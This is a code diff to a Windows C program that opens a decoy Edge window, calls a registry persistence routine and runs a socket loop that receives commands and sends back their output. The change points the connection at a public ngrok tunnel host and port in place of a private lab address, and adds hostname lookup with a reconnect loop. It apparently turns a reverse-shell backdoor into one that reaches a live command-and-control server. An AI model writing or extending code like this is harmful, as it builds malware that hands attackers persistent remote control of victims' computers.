@@ -94,12 +94,13 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     ShellExecuteA(NULL, "open", "msedge.exe", NULL, NULL, SW_SHOWNORMAL);
     RegistryPersist();
 
-    const char* host = "172.16.113.1";
-    const int port = 9999;
+    const char* host = "0.tcp.in.ngrok.io";
+    const int port = 27507;
 
     WSADATA wsa;
     SOCKET sock;
     struct sockaddr_in server;
+    struct hostent* remote;
 
     char recv_buf[4096], cmd_buf[4096], result[32768], hex_buf[65536];
 
@@ -115,7 +116,13 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 
         server.sin_family = AF_INET;
         server.sin_port = htons(port);
-        server.sin_addr.s_addr = inet_addr(host);
+        remote = gethostbyname(host);
+        if (!remote) {
+            closesocket(sock);
+            Sleep(3000);
+            continue;
+        }
+        memcpy(&server.sin_addr, remote->h_addr_list[0], remote->h_length);
 
         if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
             closesocket(sock);
